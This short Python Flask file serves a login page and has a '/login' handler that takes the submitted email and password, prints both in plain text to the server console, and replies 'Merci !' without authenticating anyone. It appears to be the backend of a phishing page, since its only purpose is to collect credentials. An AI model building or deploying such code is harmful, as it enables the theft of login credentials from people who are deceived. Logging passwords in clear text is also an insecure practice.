from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')

    print("Email:", email)
    print("Password:", password)

    return "Merci !"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
